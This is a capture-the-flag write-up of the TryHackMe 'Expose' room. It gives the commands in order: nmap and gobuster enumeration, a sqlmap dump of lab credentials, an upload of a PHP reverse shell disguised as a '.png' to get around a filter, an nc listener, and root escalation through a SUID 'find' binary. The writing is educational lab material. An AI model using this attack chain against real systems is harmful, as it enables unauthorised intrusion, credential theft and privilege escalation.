# Expose

**Room Link:** [https://tryhackme.com/room/expose](https://tryhackme.com/room/expose)

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (363).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (364).png" alt=""><figcaption></figcaption></figure>

### TCP/1337 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM:1337 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (365).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (366).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (367).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (368).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
sqlmap -r request.txt --dbms=mysql --dump
```

<figure><img src="../../.gitbook/assets/image (369).png" alt=""><figcaption></figcaption></figure>



```
+--------------------------------------+--------------------------------------+--------------------------------------+--------------------------------------+
| id                                   | email                                | created                              | password                             |
+--------------------------------------+--------------------------------------+--------------------------------------+--------------------------------------+
| 2023-02-21 09:05:46                  | 2023-02-21 09:05:46                  | 2023-02-21 09:05:46                  | 2023-02-21 09:05:46                  |
| hacker@root.thm                      | hacker@root.thm                      | hacker@root.thm                      | hacker@root.thm                      |
| 1                                    | 1                                    | 1                                    | 1                                    |
| VeryDifficultPassword!!#@#@!#!@#1231 | VeryDifficultPassword!!#@#@!#!@#1231 | VeryDifficultPassword!!#@#@!#!@#1231 | VeryDifficultPassword!!#@#@!#!@#1231 |
+--------------------------------------+--------------------------------------+--------------------------------------+--------------------------------------+

```

There are two URLs here, the second one needs a username which we don't have so we'll start with the first one.

<figure><img src="../../.gitbook/assets/image (371).png" alt=""><figcaption></figcaption></figure>

```
+----+------------------------------+-----------------------------------------------------+
| id | url                          | password                                            |
+----+------------------------------+-----------------------------------------------------+
| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (easytohack)       |
| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
+----+------------------------------+-----------------------------------------------------+

```

**Brower - /file1010111/index.php** &#x20;

```
Username: hacker@root.thm
Password: VeryDifficultPassword!!#@#@!#!@#1231
```

<figure><img src="../../.gitbook/assets/image (370).png" alt=""><figcaption></figcaption></figure>

**Browser**

```
Password: easytohack
```

<figure><img src="../../.gitbook/assets/image (372).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (373).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (374).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (376).png" alt=""><figcaption></figcaption></figure>

**Browser - /upload-cv00101011/index.php**&#x20;

```
Password: zeamkish
```

<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (378).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
cd php-reverse-shell/
cp php-reverse-shell.php php-reverse-shell.php#.png
nc -lvnp 1337 
```

<figure><img src="../../.gitbook/assets/image (379).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (382).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (381).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (383).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (384).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

<figure><img src="../../.gitbook/assets/image (385).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ssh zeamkish@$VICTIM
Password: easytohack@123
```

## Privilege Escalation

**Victim**

```
find / -perm -4000 2>/dev/null
find . -exec /bin/sh -p \; -quit
```

<figure><img src="../../.gitbook/assets/image (386).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (387).png" alt=""><figcaption></figcaption></figure>



















